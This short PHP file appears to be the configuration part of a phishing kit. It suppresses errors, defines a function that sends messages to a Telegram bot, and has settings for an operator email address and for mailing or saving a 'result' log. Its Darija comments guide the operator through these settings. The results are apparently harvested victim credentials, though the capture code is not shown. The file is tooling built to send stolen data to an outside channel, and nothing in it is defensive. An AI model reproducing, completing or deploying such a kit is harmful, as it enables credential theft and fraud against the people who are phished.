<?php
error_reporting(0);
session_start();
	function sendMessage($chatID, $messaggio, $token) {

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$Your_Email = "";  // dir email dyalk hena
$Send_Log=0;  // Send to email ila beryti tesyft ruslta boite mail dyal dir value 1 ola mabrtihach 0
$Save_Log=0;  // Save to ruslt txt ila beryti dire save rslt txt dire 1 ola mabritihach dire 0

// kolchi howa hadak 3la barati lahe 

?>